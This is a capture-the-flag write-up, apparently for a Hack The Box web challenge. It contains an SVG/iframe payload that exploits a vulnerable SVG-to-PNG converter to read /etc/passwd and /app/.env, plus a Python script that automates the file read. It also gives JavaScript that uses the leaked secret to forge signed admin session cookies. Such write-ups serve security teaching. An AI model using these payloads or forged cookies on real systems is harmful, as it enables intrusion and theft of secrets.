![image](https://user-images.githubusercontent.com/80063008/169338058-95c85aba-8ba1-47ac-90ac-afe39631efc7.png)

We can register an account and log in.

![image](https://user-images.githubusercontent.com/80063008/169338101-0ab7a421-1c1a-4d06-9cb9-c8f89b1f8522.png)

Once we log in, we can see some interaction on Cell Structure and Tadpole template. Below them we can see that only the admin can view the confidential records. That should be where the flag is.

![image](https://user-images.githubusercontent.com/80063008/169338299-9277fa52-d63d-47fd-85c4-5510e631e2b8.png)

At first I experimented with XSS in the SVG file but soon found that the cookie is protected.

![image](https://user-images.githubusercontent.com/80063008/169339083-5c8c6e0a-fc13-49b5-914c-33a281990403.png)

The export buttons use SVG to export the data and converting it to a PNG file. After a bit of research we can find a vulnerable component that does just that.

https://security.snyk.io/vuln/SNYK-JS-CONVERTSVGTOPNG-2348244

The payload below allows us to get Arbitrary File Read.

```html
<svg-dummy></svg-dummy>
<iframe src="file:///etc/passwd" width="100%" height="1000px"></iframe>
<svg viewBox="0 0 240 80" height="1000" width="1000" xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="0" class="Rrrrr" id="demo">data</text>
</svg>
```

![image](https://user-images.githubusercontent.com/80063008/169339610-ab3aa35c-a4fa-440e-8152-ce7b0906da08.png)

To make my life easier, I wrote a python script to read files faster and set eog to ignore png transparency.

```python
import requests
import json
import sys
import os

fl = sys.argv[1]

data = {"svg":f"<svg-dummy></svg-dummy>\n<iframe src=\"file://{fl}\" width=\"100%\" height=\"1000px\"></iframe>\n<svg viewBox=\"0 0 240 80\" height=\"1000\" width=\"1000\" xmlns=\"http://www.w3.org/2000/svg\">\n  <text x=\"0\" y=\"0\" class=\"Rrrrr\" id=\"demo\">data</text>\n</svg>"}
url = ' http://157.245.40.139:32544/api/export'
headers = {"Cookie": "session=eyJ1c2VybmFtZSI6Imxhenl0aXRhbiJ9; session.sig=IzxeO6oyWMpbXGnq45L_6RUc4gw", "Content-Type":"application/json"}
proxy ={"http":"http://127.0.0.1:8080"}

r = requests.post(url, headers=headers, json=data, proxies=proxy)
jsonResponse = str(r.text)
json_object = json.loads(jsonResponse)

url2 = json_object['png']

x = requests.get('http://157.245.40.139:32544' + url2)

with open("file.png", "wb") as file:
    file.write(x.content)

os.system('eog file.png')
```

![image](https://user-images.githubusercontent.com/80063008/169340472-f74db0f9-32f5-40a5-90aa-6b76c8a61c22.png)

When exporting tadpoles it accesses a null svg value which gives an error message. This error leaks folder path of the web app.

![image](https://user-images.githubusercontent.com/80063008/169340748-c7af38b0-4648-4c9a-a664-66b584784723.png)

I can leak the secret for the cookie by reading /app/.env.

![image](https://user-images.githubusercontent.com/80063008/169341018-04790260-28e7-4869-b7ed-802e01b9388b.png)

5921719c3037662e94250307ec5ed1db

This is the /app/index.js file where we see the secret being used and that it uses cookie-session.

![image](https://user-images.githubusercontent.com/80063008/169341742-0cc671ed-ef98-4be0-81d9-e79e520e8846.png)

We can Google that for a bit to find ways to use the secret and generate valid session cookies and signature.

![image](https://user-images.githubusercontent.com/80063008/169341954-45cd8f60-e7a2-46dc-839b-5ff178238ce8.png)

The first result mentions Keygrip and after a bit of research, we can try to use it. First install it.

```
npm install keygrip
```

Then generate and sign the session:

```javascript
var Keygrip = require('keygrip')

let cookie = Buffer.from(JSON.stringify({'username':'admin'})).toString('base64');
let sig = Keygrip([ "5921719c3037662e94250307ec5ed1db" ]);
let hash = sig.sign('session=' + cookie);
console.log(cookie)
console.log(hash)
```

And we get our session and session.sig values:

![image](https://user-images.githubusercontent.com/80063008/169342549-76daf1f0-e773-4ad2-b092-48655e2024f7.png)

Another way to generate the session and sesion.sig without using Keygrip:

```javascript
var URLSafeBase64 = require('urlsafe-base64');
var crypto = require("crypto");
let cookie = Buffer.from(JSON.stringify({'username':'admin'})).toString('base64');
let test = crypto.createHmac('sha1', "5921719c3037662e94250307ec5ed1db").update('session=' + cookie).digest('base64');
let hash = URLSafeBase64.encode(test)
console.log(cookie)
console.log(hash)
```

Replace those in the browser and get the flag.
![image](https://user-images.githubusercontent.com/80063008/169342635-b54ec96c-3f99-4959-add3-669818367ab3.png)

Because of the background and font, we can just simply look at the page source and copy+paste it.

![image](https://user-images.githubusercontent.com/80063008/169342725-2f3ae647-ef47-4236-9cd0-7ac7cfbaed6f.png)

HTB{fr4m3d_th3_s3cr37s_f0rg3d_th3_entrY}

